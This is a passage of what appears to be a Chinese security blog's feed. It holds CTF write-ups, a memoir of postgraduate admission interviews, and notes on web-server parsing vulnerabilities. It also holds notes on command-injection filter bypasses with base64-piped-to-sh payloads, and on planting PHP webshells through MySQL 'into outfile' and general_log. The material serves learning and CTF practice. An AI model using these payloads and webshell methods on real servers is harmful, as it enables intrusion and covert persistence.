class="line">a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>请求包:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\t%20/fl\ag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1029</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC</span><br></pre></td></tr></table></figure><p>响应包如下图：</p><img src="http://cdn.polowong.top/static/images/axbweb1.jpg"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好久没刷web了，太菜了，这道题一开始没思路，看着师傅们的wp复现出来的，踩坑踩了大概一个小时。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>山东省网络技术大赛-网络安全赛道初赛第二场wp</title>
      <link href="2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/"/>
      <url>2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>组委会太逆天了，pwn环境挂了，群里没人理的</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>进入首页有个提示，查看源码后psw.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    highlight_file( <span class="keyword">__FILE__</span> );</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span>,<span class="variable">$option</span>=<span class="string">&#x27;encode&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$option</span>==<span class="string">&#x27;encode&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$lenght</span>=strlen(<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$lenght</span>;<span class="variable">$x</span>++) &#123; </span><br><span class="line"></span><br><span class="line">            @<span class="variable">$tmp</span>=substr(<span class="variable">$string</span>,<span class="variable">$x</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ord</span>=ord(<span class="variable">$tmp</span>)+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            @<span class="variable">$result</span>=<span class="variable">$result</span>.chr(<span class="variable">$ord</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$option</span>==<span class="string">&#x27;decode&#x27;</span>)&#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    encode(<span class="string">&#x27;_Y^kdg_k&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把这段代码放到本地用phpstudy跑起来，最后调用时decode换成encode，跑出来个密码，为ichunqiu，输入到首页即可获得flag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><p>一张图片，直接stegsolve</p><img src="http://cdn.polowong.top/static/images/pgy.png"><p>往右点，有一张二维码</p><img src="http://cdn.polowong.top/static/images/sdcsmisc.jpg">扫下来base32解密即可得到flag。]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全专业-夏令营/预推免面经</title>
      <link href="2020/10/12/%E9%9D%A2%E7%BB%8F/"/>
      <url>2020/10/12/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>现在是2020年10月12日下午18点19分，我于今天上午收到了来自电子科技大学的录取通知，确定后，意味着保研之旅正式结束。</p><img src="http://cdn.polowong.top/static/images/uestc.jpg"><p>在这长达一年的准备时间里，感谢父母、家人、学校、学院对我的支持，感谢保研前辈对我的指点，感谢朋友们为我提供信息，加油鼓劲。</p><h1 id="夏令营和预推免情况"><a href="#夏令营和预推免情况" class="headerlink" title="夏令营和预推免情况"></a>夏令营和预推免情况</h1><p>夏令营申请学校：30+所985，211学校，只有山大、中海洋、中央财经、国防科大电子对抗学院通过了初审。</p><p>夏令营通过学校：中海洋专硕、国防科大电子对抗学院 网络安全 学硕，其中拒绝了中央财经的面试。</p><p>预推免申请学校：山大、天大、电子科大、西北工业大学、哈工大、复旦、西电等。</p><p>预推免通过学校：山大网安学硕、天大网安学硕、电子科大网安学硕（其中拒绝了西北工大、西电面试）</p><p>最终去向：电子科技大学-计算机学院-网络空间安全-学硕 ，张小松教授团队 ，研究方向：云计算与IOT安全。</p><h1 id="个人情况介绍"><a href="#个人情况介绍" class="headerlink" title="个人情况介绍"></a>个人情况介绍</h1><h2 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a>背景简述</h2><p>GPA:4.1/5.0（专业1/49）;  CET-4:540;  CET-6:548;</p><p>一篇国家级普刊，美赛一等奖，蓝桥杯省二，两次校一等奖学金、山东省政府奖学金、数次CTF竞赛经历。</p><p>一段专业短期实习经历，两个小项目。（全部专业高度相关）</p><h2 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h2><p>我来自山东省一所一本学校——曲阜师范大学，本科背景通俗地讲叫做“双非”。</p><p>我自初中起对网络安全技术感兴趣，一直在断断续续地摸索，大学选择了软件工程专业，算是正式进入计算机行业科班。</p><p>大一没有特别认真学习，GPA为3.8/5，暑假有一段香港访学经历，无校级以上奖项。</p><p>大一从香港回来后，励志去港校，经咨询后GPA对我来说至少要4以上，于是大二开始每天认真学习专业知识，泡自习室。大二通过了四六级考试，四级540，六级第一次501。拿到了蓝桥杯编程山东省二等奖（水），随师哥去外省参加了两次CTF线下赛（划水），没什么成绩。大二最终GPA为4.01，大二学年GPA为4.32，全年级最高。</p><p>大三在师哥的建议下决定尝试保研，于是开始从公众号了解相关政策信息，一开始也是懵懂无知的状态，知道了需要准备简历、项目、竞赛、论文、四六级。</p><h1 id="保研准备"><a href="#保研准备" class="headerlink" title="保研准备"></a>保研准备</h1><p>大三上学期通过了六级考试，在严格的模拟训练下拿到了548分，还算满意。由于疫情原因在家耽误了一段时间，过年那段时间主要在家学保研课，了解如何写个人简历、自我介绍、自我陈述、学校申请等相关流程。</p><p>2020年2月份与两位数学的队友一起参加了美国大学生数学建模竞赛，我基本负责除了写论文和建模外的其他内容。（我是辅助），最终拿了国际一等奖的成绩，这与我两位队友的努力是分不开的，致谢。</p><p>2020年2月份大致准备好了简历、自我介绍（中英文，长短各一份，共四份）、个人陈述、推荐信、证书证件扫描等文书工作。简历的完善工作一直到最后一次面试前，约四五十次大大小小的修改吧。</p><p>2020年三月份成功投稿了我在一月份开始写的一篇期刊，投稿至国家级普刊，期间学习了很多知识。</p><p>2020年三月开始正式打CTF、学习CTF知识，写博客。</p><p>2020年4月完成了基于flask框架的图书管理系统（一个很小的项目，总共就四五百行代码）四月份开始了解专业前景，向各位前辈以及知乎、交流群里打听专业强校、强老师。</p><p>2020年5月完成了基于Nmap和Masscan扫描器的Web扫描器，并改进了CTF-wscan扫描器（主要是优化了多线程与重复扫描问题，当然目前还存在一些bug）。五月份开始联系导师，其中有一位南方学校的老师为我提供了一次宝贵的实习机会。在此向魏老师致谢。</p><p>2020年6月在老师的推荐下赴广州进行实习，职位是渗透测试工程师。两个月的实习期间主要是学会了一些思路与工具，收获了一些好友与人脉。期间也在不断地投递简历与联系老师。六月底通过了中海洋、山大的初审。</p><p>2020年7月拿到了中海洋优营，国防科大电子对抗学院录取范围第二名，参加电子科技大学导师团队面试并通过，与此同时继续实习。</p><p>2020年8月通过了深信服北京安全研发中心实习生两轮技术面，因学校时间冲突原因放弃hr面。</p><p>2020年9月通过北京hw蓝队面试，薪资是最低的1.3k一天包吃住（彩笔）、通过了天大复试，拿到了学硕offer</p><p>2020年10月通过电子科大、山大复试，拿到本校推免资格，拿到学硕offer并上岸。</p><h1 id="劝告"><a href="#劝告" class="headerlink" title="劝告"></a>劝告</h1><p><strong>保研是一场信息战，但要学会如何获取有用、有价值的信息，学会交朋友，有时候外校朋友的信息能决定你的命运</strong></p><p><strong>联系老师很重要，你会发现我所有入营且拿到offer的学校都提前联系了老师。</strong></p><h1 id="夏令营面经"><a href="#夏令营面经" class="headerlink" title="夏令营面经"></a>夏令营面经</h1><p>由于夏令营都在卷，入营非常少，山大是报名的全入营了，没有参考价值。</p><p>下面按照时间顺序来说</p><h2 id="中国海洋大学-信息学院"><a href="#中国海洋大学-信息学院" class="headerlink" title="中国海洋大学 信息学院"></a>中国海洋大学 信息学院</h2><p>中海洋第一个面试，我提前联系了老师，老师人很好，在信息学院做安全算是比较好的老师了，邮件联系后，正好老师负责夏令营审批，给了我入营资格。今年中海洋计算机夏令营初审报了四百多，可想而知。</p><p>在入营后有一个热身活动，选定一个方向以及问题，对这个问题展开研究并写论文和ppt录屏五分钟内汇报。我选的是系统安全的问题，meltdown，防御方法有KASLR等。</p><p>面试前一晚有个机试，据说机试不算成绩里面，但是面试官会有机试的成绩。大概题目都是些比较简单的格式输入输出，算平均分之类的，最后一个是类似矩阵转置输出。。没写上来草。</p><p>面试大概是上来先抽题 我抽到了简述计算机网络OSI七层模型，然后就是老师提问，问我极限编程的概念。。。不会；问我MIPS了解多少。。。不会；问我ACID ，说了AID忘了C的含义是啥了。。。尴尬；最后等了一周给了专硕。</p><h2 id="山东大学-网络空间安全学院"><a href="#山东大学-网络空间安全学院" class="headerlink" title="山东大学 网络空间安全学院"></a>山东大学 网络空间安全学院</h2><p>SDU网安是我比较想去的一个学校，有想跟的老师，可惜那位老师不要我，当然，还有一位想跟的老师，那位老师人很好，我也提前和他联系了。</p><p>夏令营山大网安面试120个人收17个优营，包括6个左右的本校..</p><p>面试当天问我对密码学有多少了解，我说了解过对称、非对称加密，在蚁剑加密流量分析中用过。然后问我了解过哪些系统安全方面的漏洞，我说meltdown，我说本科主要是做web方向，老师说希望我以后多了解系统安全的知识。（其他细节记不太清了 夏令营印象不是太深刻）</p><p>最后优营当然没我啥事</p><h2 id="国防科技大学-电子对抗学院"><a href="#国防科技大学-电子对抗学院" class="headerlink" title="国防科技大学 电子对抗学院"></a>国防科技大学 电子对抗学院</h2><p>NUDT电抗我先联系了一位教授，如沐春风的感觉，给人一种和蔼可亲的感觉，在和地方生学长交流的时候得知该老师水平很高，要求严格，不缺学生，我也很荣幸他能相中我。</p><p>在面试的时候设备问题，一直吱吱啦啦对面听不清，进行英文自我介绍的时候被迫叫停。后面简单问了问项目、实习和美赛经历，重点问了美赛里面我承担的工作，并问了主要是谁翻译的。</p><p>最后考核结果夏令营录取名额网安为10个，我排第二，免预推免复试。</p><h2 id="中央财经大学-信息学院"><a href="#中央财经大学-信息学院" class="headerlink" title="中央财经大学 信息学院"></a>中央财经大学 信息学院</h2><p>没去面试</p><h2 id="西北工业大学-网络空间安全学院"><a href="#西北工业大学-网络空间安全学院" class="headerlink" title="西北工业大学 网络空间安全学院"></a>西北工业大学 网络空间安全学院</h2><p>没去面试</p><h1 id="预推免面经"><a href="#预推免面经" class="headerlink" title="预推免面经"></a>预推免面经</h1><p>预推免的bar明显低了不少。</p><h2 id="电子科技大学-导师面试"><a href="#电子科技大学-导师面试" class="headerlink" title="电子科技大学 导师面试"></a>电子科技大学 导师面试</h2><p>电子科技大学在七月下旬提前联系导师，参加了导师团队面试。一共大概三四位老师，首先用中文简单地介绍了自己，问我的项目写了多少行代码，是不是自己写的，问我的扫描器能否在扫描速度很快的情况下扫描完所有目标URL，问ZOOMEYE\FOFA\SHODAN等空间测绘引擎的区别是什么（主要看着简历问），问了问我美赛的获奖比例以及负责的工作。最后问了我校是否985211，数小时后被通知通过团队面试，经过学院面试后可直接报老师。</p><h2 id="天津大学-智能与计算学部"><a href="#天津大学-智能与计算学部" class="headerlink" title="天津大学 智能与计算学部"></a>天津大学 智能与计算学部</h2><p>天大我先联系了一位老师，这位老师的研究方向和我非常符合，老师也很明确地想要我，但是夏令营卡985211，所以我没进去，等预推免才进去的。</p><p>面试首先是一分钟的英文自我介绍，介绍过后讲一下自己准备的PPT（可以中文再介绍一下）然后讲一个你认为最重要的项目（我当时听错了，我以为是不限科研经历，只限一个项目，所以我一共讲了三个，面试老师有些不太高兴），最后问了问我的论文是怎么写的，创新点在哪里。结束面试</p><p>最后给了网安学硕，非常非常感谢许老师。</p><h2 id="山东大学-网络空间安全学院-1"><a href="#山东大学-网络空间安全学院-1" class="headerlink" title="山东大学 网络空间安全学院"></a>山东大学 网络空间安全学院</h2><p>和老师联系过后我觉得去山大专硕还是比较有希望的，于是报了山大的预推免，比较晚，面试在8号。</p><p>面试首先是一轮拷问，还是问我美赛负责的工作、问我本科做什么方向，说我本科打web，研究生方向不太一样。然后有个老师用英文让我描述一下我的数据可视化项目，还有一位老师问了KASLR的作用以及原理。。原理没说上来，还是这位老师，问了我的论文创新点在哪里，有没有自己的新东西….一针见血。。果然不一般。</p><p>最后想着能有专硕就行了，结果老师帮我递补了学硕，感谢sdu，感谢郭老师。</p><h2 id="电子科技大学-计算机科学与工程学院"><a href="#电子科技大学-计算机科学与工程学院" class="headerlink" title="电子科技大学 计算机科学与工程学院"></a>电子科技大学 计算机科学与工程学院</h2><p>UESTC是我最后一战，非常紧张。</p><p>面试首先是三分钟的PPT自我介绍，介绍了学术背景、科研经历、项目经历。</p><p>然后是抽题 ，抽到的题是描述算法，如何找出两个stirng的公共字符。</p><p>接下来是英文问题，describe a project 和 why choose our school?</p><p>都比较简单，老考点了。</p><p>下面就开始拷问了，专业知识问了软件测试的四个过程，黑盒测试和白盒测试的区别，因为我本科是软件工程，问我凭什么报信息安全（？）我说我自己本科主动学习相关知识等。</p><p>安全开发的经历、这个短期实习你觉得你都收获了什么东西？</p><p>美赛主要负责哪些内容？</p><p>接下来老师问我更偏向纯技术还是部分技术+social，我选择了前者。</p><p>最后老师问我目前的主攻方向是什么，我BB了一堆打太极，最后老师又问，我破防了，遂说Web安全/渗透测试。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>保研既有实力也有运气，祝大家好运。</strong></p><p>不能保证好运的前提下请尽量提升自我，因为在面试中不一定会遇到什么问题，请完善简历，务必对简历上的每一个问题都熟悉。</p><p>当你觉得晚了的时候开始，恰恰是最早的时候，<strong>现在开始，一切不晚</strong>。</p><p>学会社交，学会问问题，学会和老师沟通交流，决定鸽的时候要尽量尽早，就算不能早鸽也一定提前和老师说明情况，大多数老师会理解。一定处理好和学校的关系，这不仅关乎你，更关乎你的学弟学妹。</p><h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p><strong>个人VX:ab444o 欢迎师弟师妹交流保研相关问题~</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解析漏洞小结</title>
      <link href="2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
      <url>2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.jianshu.com/p/a1fa305a6b8f">https://www.jianshu.com/p/a1fa305a6b8f</a></p><h1 id="IIS5-6解析漏洞"><a href="#IIS5-6解析漏洞" class="headerlink" title="IIS5/6解析漏洞"></a>IIS5/6解析漏洞</h1><p>目录解析:在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被IIS当作可执行文件来解析并执行。<br>比如 <a href="http://www.baidu.com/1.asp/1.jpg">www.baidu.com/1.asp/1.jpg</a><br>文件解析:在IIS6.0下，分号后面的不被解析，也就是说6.0下，分号后面的不被解析，也就是说xx.asp;.jpg将被当做xx.asp解析并执行。<br><a href="http://www.xxx.com/xx.asp;.jpg">http://www.xxx.com/xx.asp;.jpg</a><br>IIS6.0 默认的可执行文件有asp、asa、cer、cdx四种。</p><h1 id="IIS-7-0-IIS-7-5-Nginx-lt-0-8-3畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-0-8-3畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞"></a>IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞</h1><p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.PHP会将 /xx.jpg/xx.php 解析为 php 文件。<br>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p><h1 id="Nginx-lt-0-8-37-解析漏洞"><a href="#Nginx-lt-0-8-37-解析漏洞" class="headerlink" title="Nginx &lt;=0.8.37 解析漏洞"></a>Nginx &lt;=0.8.37 解析漏洞</h1><p>00截断<br>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞<br>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p><h1 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h1><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3 则会被解析为php</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过(ping ping ping)</title>
      <link href="2020/06/20/ping-ping-ping/"/>
      <url>2020/06/20/ping-ping-ping/</url>
      
        <content type="html"><![CDATA[<p>页面给了个ip，考虑ping命令的命令执行。<br>这里过滤的内容比较多，过滤了空格，而且有些空格绕过方法也用不了。<br>这里绕过空格用的是$IFS$9<br>接下来尝试cat flag<br>flag字段也被过滤了，尝试使用通配符也不行，*也不行，[]符号也被过滤了。<br>接下来尝试base64编码。<br>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 可行<br>还有一种方法是cat <code>反引号里面的内容---</code> 或$() 会引用命令被执行后的结果。<br>?ip=127.0.0.1;cat$IFS$9<code>ls</code><br>还有一种方法就是拼接：<br>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php<br>这样也可以绕过。<br>补充空格绕过：{cat,1.txt}<br>关键字过滤绕过：反斜杠 ca\t、变量代换、编码、 echo xxxx | base64 -d|sh/bash、引号c’a’t<br>命令分隔与执行多条命令<br>1.&amp;<br>&amp; 表示将任务置于后台执行<br>2.&amp;&amp;<br>只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。<br>3.|<br>| 表示管道，上一条命令的输出，作为下一条命令的参数<br>4.||<br>只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。<br>5.；<br>多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试问题整理</title>
      <link href="2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/"/>
      <url>2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本文不间断地记录面试遇到的问题，希望能对自己有个警醒，对后辈有所作用。</p><h1 id="MySQL写Webshell的条件"><a href="#MySQL写Webshell的条件" class="headerlink" title="MySQL写Webshell的条件"></a>MySQL写Webshell的条件</h1><p>1.知道网站绝对路径<br>2.有对网站绝对路径的写权限 select @@basedir;<br>3.没有配置secure_file_priv 或者其为空<br>4.GPC关闭（默认关闭）<br>secure_file_priv已经设置的话，可以通过修改日志文件到网站根目录，然后通过包含的方式写shell<br>流程：<br>首先找到日志存放位置：<br>接下来设置general_log 为on：set global general_log = on;<br>接下来把日志文件修改为网站绝对目录下的某个文件 比如set global general_log_file =’/var/www/html/shell.php’;<br>接下来select <?php eval($_POST['cmd']); ?> 即可记录到日志文件中，在URL中访问日志文件即可。<br>这里需要注意一个问题，如果目标站点数据库访问频繁的话可能日志文件会很大，连shell会很卡，所以拿到该shell后重新再传一个隐蔽点的shell，再把日志文件改回去，关闭日志记录的功能。</p><h1 id="mysql常用查询"><a href="#mysql常用查询" class="headerlink" title="mysql常用查询"></a>mysql常用查询</h1><p>select @@version; 查询数据库版本<br>select @@basedir; 查询MYSQL安装路径<br>select @@plugin_dir ; 查看plugin路径<br>select host, user, password from mysql.user; 查询hash (MySQL &lt;= 5.6 )<br>select host, user, authentication_string from mysql.user; 查询hash (MySQL &gt;= 5.7 )<br>select @@version_compile_os,@@version_compile_machine; 查询当前操作系统</p><h1 id="写shell的几种方式"><a href="#写shell的几种方式" class="headerlink" title="写shell的几种方式"></a>写shell的几种方式</h1><h2 id="Union-select"><a href="#Union-select" class="headerlink" title="Union select"></a>Union select</h2><p>union select ‘<?php eval($_POST['cmd']); ?>‘ into outfile /var/www/html/shell.php#</p><h2 id="lines-terminated-by"><a href="#lines-terminated-by" class="headerlink" title="lines terminated by"></a>lines terminated by</h2><p>select * from phpcmsv9.v9_admin_role where roleid = 1 into outfile ‘C:/wamp64/www/work/webshell.php’ lines terminated by ‘<?php phpinfo() ?>‘;<br>原理：<br>通过select语句查询的内容写入文件，也就是 1 into outfile ‘C:/wamp64/www/work/webshell.php’ 这样写的原因，然后利用 lines terminated by 语句拼接webshell的内容。lines terminated by 可以理解为 以每行终止的位置添加 xx 内容。</p><h2 id="lines-starting-by"><a href="#lines-starting-by" class="headerlink" title="lines starting by"></a>lines starting by</h2><p>类似lines terminated by</p><h2 id="fields-terminated-by"><a href="#fields-terminated-by" class="headerlink" title="fields terminated by"></a>fields terminated by</h2><p>利用 fields terminated by 语句拼接webshell的内容。fields terminated by 可以理解为 以每个字段的位置添加 xx 内容。</p><h2 id="columns-terminated-by"><a href="#columns-terminated-by" class="headerlink" title="columns terminated by"></a>columns terminated by</h2><p>如上同理</p><h1 id="sqlmap写webshell"><a href="#sqlmap写webshell" class="headerlink" title="sqlmap写webshell"></a>sqlmap写webshell</h1><p>类似上述Mysql写webshell，不过更自动化了，使用命令为 mysql -u url –os-shell，要求同上–目录可写，关闭gpc，绝对路径，ban secure_file_priv</p><h1 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h1><p>参考链接：<br><a href="https://blog.csdn.net/qq_26406447/article/details/102691188">https://blog.csdn.net/qq_26406447/article/details/102691188</a><br><a 